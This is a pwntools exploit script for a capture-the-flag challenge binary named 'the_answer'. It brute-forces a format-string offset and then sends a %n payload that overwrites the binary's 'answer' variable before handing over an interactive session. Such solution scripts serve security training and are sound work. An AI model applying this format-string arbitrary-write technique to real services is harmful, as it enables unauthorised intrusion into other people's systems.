#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template the_answer --host answer.challs.cyberchallenge.it --port 9122
from pwn import *
from typing import Any

# Set up pwntools for the correct architecture
exe = context.binary = ELF("the_answer")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "answer.challs.cyberchallenge.it"
port = int(args.PORT or 9122)


def start_local(argv: list[str] = [], *a: Any, **kw: Any):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv: list[str] = [], *a: Any, **kw: Any):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv: list[str] = [], *a: Any, **kw: Any):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


def brute_force():
    for i in range(50):
        io = start()
        io.recvline()
        io.sendline((f"aaaa%{i}$x").encode())
        line = io.recvline()
        if b"61" * 4 in line:
            return i
    raise Exception()


offset = brute_force()


io = start()

ADDRESS = exe.symbols.answer

# 0x7ffe0f32b060

line = b"%42p" + f"%{offset+2}$naaaaaaa".encode() + p64(ADDRESS)

print(line)

io.sendline(line)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
